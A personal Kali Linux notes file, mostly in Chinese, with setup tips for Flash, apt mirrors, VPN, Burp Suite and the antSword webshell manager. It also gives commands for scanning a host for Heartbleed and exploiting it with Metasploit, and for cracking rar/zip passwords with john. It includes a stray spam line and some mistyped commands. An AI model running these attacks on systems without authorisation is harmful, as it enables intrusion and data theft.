#problem while using kali

##update flash plugin
> 不知道为什么kali 自带的 update-flashplugin-nonfree --install 并不能成功更新flashplugin

1. 在https://get.adobe.com/cn/flashplayer/ 下载flash插件，或者是这个链接 https://fpdownload.adobe.com/get/flashplayer/pdc/11.2.202.621/install_flash_player_11_linux.x86_64.tar.gz  用的时候记得改下版本
2. 解压
```
wget https://fpdownload.adobe.com/get/flashplayer/pdc/11.2.202.621/install_flash_player_11_linux.x86_64.tar.gz -O /tmp/flash.tar.gz
cd /tmp
tar x -f flash.tar.gz
cp flash.tar/gz /var/cache/flashplugin-nonfree/
cd flash

#下面这一步是flash的readme里没有的，但是update-flashplugin-nonfree里有的
cp libflashplayer.so ~/usr/lib/flashplugin-nonfree/

cp libflashplayer.so ~/.mozilla/plugins/
cp -r usr/* /usr
```

## apt source.list
```
#tsinghua mirrors
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib
#deb-src http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib

deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling-only main non-free contrib
#deb-src http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling-only main non-free contrib
```

## vpn 
1. `apt-get install network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome`
2. restart the network-manager `service network-manager restart`
3. [获取网址]
如果您需要获取本站最新网址，可随时发任意邮件至  GreenDizhi@gmail.com  系统将自动回复最新网址到您的邮箱。

## heartbleed
nmap+msfconsole</br>

learn from http://blog.163.com/xiao106347/blog/static/215992078201464059117/

非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：
```
cd /usr/share/nmap/scripts/
wget https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse
cd /usr/share/nmap/nselib/
wget https://svn.nmap.org/nmap/nselib/tls.lua
nmap --script-updatedb
```
添加成功之后扫描一个没有更新openssl的网站：
`nmap -n -p 443 -Pn --script=ssl-heartbleed servers_ip`
出现如下漏洞信息：

然后`msfconsole`载入 `auxiliary/scanner/ssl/openssl_heartbleed` 模块：
```
msf > use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS xxx_ip
set RPORT 443
set VERBOSE true
exploit
```

#

## antSword
项目地址：`https://github.com/antoor/antSword`
主要问题是安装过程：参照 http://my.oschina.net/blogshi/blog/260953 
```
    这就妥妥的了，node文件夹具体放在哪，叫什么名字随你怎么定。然后设置全局：

ln -s /home/kun/mysofltware/node-v0.10.28-linux-x64/bin/node /usr/local/bin/node
ln -s /home/kun/mysofltware/node-v0.10.28-linux-x64/bin/npm /usr/local/bin/npm

    这里/home/kun/mysofltware/这个路径是你自己放的，你将node文件解压到哪里就是哪里。

```

## virtualbox
win 10 iso
`ed2k://|file|cn_windows_10_enterprise_2015_ltsb_x64_dvd_6848425.iso|3907538944|38E47AB92B6D97DF2BE602BBC9969D34|/`

## 更新kali自带的burpsuite
从官网下载最新版的burpsuite：https://portswigger.net/

`chmod 755 burpsuite.jar`

将新版本移动到/usr/bin目录下，然后更名为burpsuite：

`mv burpsuite.jar /usr/bin`
`mv burpsuite.jar burpsuite`

##use john to crack rar,zip
1. use binwalk to check it first!
2. use `rar2john` or `zip2john` to get a hashes
3. use john  to crack it
```
rar2john rarfile.rar > 1
john 1 --wordlist=1111111111111.lst
john 1 --show
```



